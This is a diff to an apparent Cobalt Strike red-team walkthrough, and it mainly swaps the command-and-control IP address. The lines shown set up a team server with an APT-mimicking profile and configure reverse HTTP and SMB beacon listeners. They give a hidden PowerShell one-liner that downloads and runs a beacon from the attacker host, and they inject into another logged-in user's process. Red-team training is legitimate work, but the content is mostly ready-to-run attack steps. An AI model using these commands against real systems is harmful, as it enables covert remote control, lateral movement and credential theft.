@@ -13,10 +13,11 @@ apt-get install oracle-java8-installer
 cd /opt/cobaltstrike/
 ./update
 
-Start up team server
+Start the team server
      ./teamserver <IP> <password> <Malleable C2 profile> <kill date for Beacons>
-     The first 2 parameters are required, while the second 2 are optional.
-     ./teamserver 172.16.100.169 redteam /opt/cobaltstrike-profiles/APT/etumbot.profile
+     The first 2 parameters are required.
+
+     ./teamserver 172.16.100.32 redteam /opt/cobaltstrike-profiles/APT/etumbot.profile
      Copy the SHA256 hash and send to other members on your team.
 
 Login to team server
@@ -34,14 +35,14 @@ Create listeners
      Cobalt Strike > Listeners > Add
      Name: http
      Payload: windows/beacon_http/reverse_http
-     Host: 172.16.100.169
+     Host: 172.16.100.32
      Port: 80
      Save > Ok > Ok
 
      Add
      Name: smb
      Payload: windows/beacon_smb/bind_pipe
-     Host: 172.16.100.169
+     Host: 172.16.100.32
      Port: <greater than 1024>
      Save
 ------------------------------------------------------------------------------------------------------
@@ -74,7 +75,7 @@ Target VM
 Option 2 (not touching disk)
      Attacks > Web Drive-by > Scripted Web Delivery
      URI Path: /a
-     Local Host: 172.16.100.169
+     Local Host: 172.16.100.32
      Local Port: 80
      Listener: http
      Type: powershell
@@ -83,7 +84,7 @@ Option 2 (not touching disk)
 
 Target VM
      Open Terminal and paste
-     powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring(172.16.100.169:80/a'))"
+     powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring(172.16.100.32:80/a'))"
      In about 5 sec, you should have a callback on the team server.
 ------------------------------------------------------------------------------------------------------
 
@@ -123,7 +124,7 @@ Dump passwords
 
      ps
      Look for another user logged in and copy the PID of their process.
-     inject <PID> <x86|x64> <listener>
+     inject <PID> <arch> <listener>
      inject 5678 x64 smb
      Select the new user in the top pane > right click > Interact
 ------------------------------------------------------------------------------------------------------
